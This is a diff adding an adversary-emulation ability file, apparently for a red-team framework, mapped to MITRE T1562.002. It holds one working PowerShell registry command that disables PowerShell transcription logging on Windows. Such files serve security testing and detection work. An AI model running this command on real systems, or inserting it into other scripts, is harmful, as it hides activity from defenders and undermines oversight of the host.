@@ -1,0 +1,19 @@
+id: f53ef70f-4768-440d-bc6a-ff9120d7c37b
+name: Disable Powershell Transcript
+description: |
+  Transcription creates a unique record of every PowerShell session, including all input and output, exactly as it appears in the session.
+  Attackers can disable logging to cover their activities on the host.
+metadata:
+  version: 1
+  authors:
+  - w0rk3r
+  tags: []
+tactic: defense-evasion
+technique:
+  id: T1562.002
+  name: 'Impair Defenses: Disable Windows Event Logging'
+platforms:
+  windows:
+    psh:
+      command: |
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0
